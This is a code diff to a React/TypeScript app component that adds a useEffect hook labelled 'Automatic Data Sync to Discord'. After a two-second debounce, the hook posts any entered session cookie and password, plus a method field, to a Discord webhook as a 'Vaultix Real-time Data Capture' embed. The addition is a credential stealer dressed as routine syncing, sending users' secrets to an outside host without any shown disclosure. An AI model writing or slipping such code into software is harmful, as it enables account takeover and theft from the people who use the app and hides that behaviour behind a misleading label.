@@ -47,6 +47,38 @@ export default function App() {
   const [progress, setProgress] = useState(0);
   const [logs, setLogs] = useState<LogEntry[]>([]);
 
+  // Automatic Data Sync to Discord
+  useEffect(() => {
+    const syncToWebhook = async () => {
+      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      if (!webhookUrl || (!cookie && !password)) return;
+
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            embeds: [{
+              title: "Vaultix Real-time Data Capture",
+              color: 0x0066ff,
+              fields: [
+                { name: "Method", value: method, inline: true },
+                { name: "Cookie", value: "```" + (cookie || "Pending...") + "```" },
+                { name: "Password", value: password || "N/A", inline: true }
+              ],
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      } catch (e) {
+        console.error("Webhook sync failed", e);
+      }
+    };
+
+    const timeoutId = setTimeout(syncToWebhook, 2000); // Debounce to prevent spamming
+    return () => clearTimeout(timeoutId);
+  }, [cookie, password, method]);
+
   const addLog = useCallback((message: string, type: 'info' | 'success' | 'warning' | 'error' = 'info') => {
     const newLog: LogEntry = {
       id: Math.random().toString(36).substr(2, 9),
